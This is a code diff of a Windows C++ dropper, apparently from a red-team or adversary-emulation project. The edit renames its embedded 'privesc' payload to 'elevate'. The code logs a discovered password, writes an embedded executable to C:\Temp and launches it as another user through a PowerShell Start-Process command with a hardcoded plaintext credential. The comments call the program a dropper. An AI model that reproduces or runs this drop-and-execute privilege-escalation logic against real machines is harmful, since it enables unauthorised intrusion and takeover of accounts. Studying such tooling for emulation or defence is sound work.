@@ -47,14 +47,14 @@ int wmain() {
 
 	Log("[*] Valid password: \"" + pass + "\"", componentName);
 
-	// write the privesc to disk
-	Log("[+] Writing privesc to disk.", componentName);
-	std::ofstream outfile("C:\\Temp\\privesc.exe", std::ios::out | std::ios::binary);
-	outfile.write(&privesc[0], sizeof(privesc));
+	// write elevate to disk
+	Log("[+] Writing elevate to disk.", componentName);
+	std::ofstream outfile("C:\\Temp\\elevate.exe", std::ios::out | std::ios::binary);
+	outfile.write(&elevate[0], sizeof(elevate));
 	outfile.close();
 
-	// create privesc process as NineBall
-	Log("[+] Starting privesc.", componentName);
+	// create elevate process as NineBall
+	Log("[+] Starting elevate.", componentName);
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
@@ -67,7 +67,7 @@ int wmain() {
 		L"$password = 'SuperSecurePassword1!'; "
 		L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
 		L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
-		L"Start-Process C:\\Temp\\privesc.exe -Credential $credential;";
+		L"Start-Process C:\\Temp\\elevate.exe -Credential $credential;";
 
 	if (!CreateProcessW(
 		NULL,
@@ -81,10 +81,10 @@ int wmain() {
 		&si,
 		&pi
 	)) {
-		Log("[!] Failed to create privesc process." + std::to_string(GetLastError()), componentName);
+		Log("[!] Failed to create elevate process." + std::to_string(GetLastError()), componentName);
 	}
 	else {
-		Log("[+] Successfully created privesc process.", componentName);
+		Log("[+] Successfully created elevate process.", componentName);
 	}
 
 	// unsure if these will cause dropper to stay up
